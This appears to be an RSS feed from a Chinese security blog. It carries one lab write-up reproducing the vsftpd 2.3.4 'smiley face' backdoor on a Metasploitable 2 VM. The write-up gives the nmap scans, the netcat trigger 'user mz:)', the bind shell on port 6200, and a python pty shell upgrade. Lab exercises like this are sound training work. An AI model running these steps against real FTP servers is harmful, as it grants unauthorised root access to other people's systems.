@@ -1,0 +1,193 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>笑脸漏洞 on SoulJian小站</title><link>https://souljian.cn/tags/%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</link><description>Recent content in 笑脸漏洞 on SoulJian小站</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 21 Apr 2025 12:59:27 +0800</lastBuildDate><atom:link href="https://souljian.cn/tags/%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml"/><item><title>FTP笑脸漏洞复现</title><link>https://souljian.cn/p/745211567/</link><pubDate>Mon, 21 Apr 2025 12:59:27 +0800</pubDate><guid>https://souljian.cn/p/745211567/</guid><description>&lt;p>&lt;strong>实验笔记：vsftpd 2.3.4 笑脸漏洞复现&lt;/strong>&lt;/p>
+&lt;h2 id="实验目标">&lt;strong>实验目标&lt;/strong>
+&lt;/h2>&lt;p>复现 vsftpd 2.3.4 的&amp;quot;笑脸漏洞&amp;quot;，通过该漏洞获取靶机的 root 权限。&lt;/p>
+&lt;h2 id="实验环境">&lt;strong>实验环境&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>攻击机&lt;/strong>：Kali Linux&lt;/li>
+&lt;li>&lt;strong>靶机&lt;/strong>：Metasploitable Linux 2.0.0&lt;/li>
+&lt;/ul>
+&lt;h2 id="实验步骤">&lt;strong>实验步骤&lt;/strong>
+&lt;/h2>&lt;h3 id="一环境搭建">&lt;strong>一、环境搭建&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>下载并启动靶机&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>下载 Metasploitable Linux 2.0.0 镜像文件。&lt;/li>
+&lt;li>解压后使用 VMware 打开并启动虚拟机。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>登录靶机并修改 root 密码&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>使用普通用户 &lt;code>msfadmin&lt;/code> 登录，密码为 &lt;code>msfadmin&lt;/code>。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>修改 root 用户的密码：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfadmin@metasploitable:~$ sudo passwd root
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>按提示输入新密码。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="二漏洞复现">&lt;strong>二、漏洞复现&lt;/strong>
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>端口扫描&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>在 Kali Linux 上打开终端，使用 nmap 扫描靶机的开放端口：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap 192.168.xx.xx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>（将 &lt;code>192.168.xx.xx&lt;/code> 替换为靶机的实际 IP 地址）&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>确认靶机开放了 21 (FTP) 端口。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221111-20250416221113-c45aigt.png"
+loading="lazy"
+alt="局部截取_20250416_221111"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>扫描 FTP 服务版本&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>使用 nmap 扫描 FTP 服务的版本信息：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sV 192.168.xx.xx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>确认靶机运行的是 vsftpd 2.3.4 版本。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221133-20250416221138-tl3olrd.png"
+loading="lazy"
+alt="局部截取_20250416_221133"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>触发漏洞&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>在 Kali Linux 上使用 Netcat (nc) 连接靶机的 21 端口：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 192.168.xx.xx &lt;span class="m">21&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>输入以下命令（注意手动输入）：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">user mz:)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pass aaaaa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>此时靶机的 6200 端口会自动开启。保持当前终端状态，不要关闭。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221204-20250416221212-na23h58.png"
+loading="lazy"
+alt="局部截取_20250416_221204"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>验证 6200 端口&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>在 Kali Linux 上另起一个终端，使用 nmap 扫描 6200 端口：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -sS -p &lt;span class="m">6200&lt;/span> 192.168.xx.xx
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>确认 6200 端口已开启。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221242-20250416221245-a36mo8g.png"
+loading="lazy"
+alt="局部截取_20250416_221242"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>获取 root 权限&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>使用 Netcat 连接靶机的 6200 端口：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc 192.168.xx.xx &lt;span class="m">6200&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>成功连接后，即可以 root 身份登录靶机。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;img src="https://souljian.cn/assets/%e5%b1%80%e9%83%a8%e6%88%aa%e5%8f%96_20250416_221315-20250416221318-gied7ac.png"
+loading="lazy"
+alt="局部截取_20250416_221315"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>注意：连接后执行ls查看是都已经进去半终端&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>确认进入半终端可执行python -c &amp;lsquo;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo; 调用完整终端&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;h3 id="三实验注意事项">&lt;strong>三、实验注意事项&lt;/strong>
+&lt;/h3>&lt;ul>
+&lt;li>如果在实验过程中遇到问题，可以尝试重启靶机。&lt;/li>
+&lt;li>确保在触发漏洞后保持 Netcat 连接状态，否则 6200 端口可能会关闭。&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;p>&lt;strong>实验总结：&lt;/strong>
+本次实验通过 vsftpd 2.3.4 的&amp;quot;笑脸漏洞&amp;quot;，成功获取了靶机的 root 权限。实验过程中，关键在于正确触发漏洞并保持 Netcat 连接状态，以确保后续操作的顺利进行。&lt;/p></description></item></channel></rss>
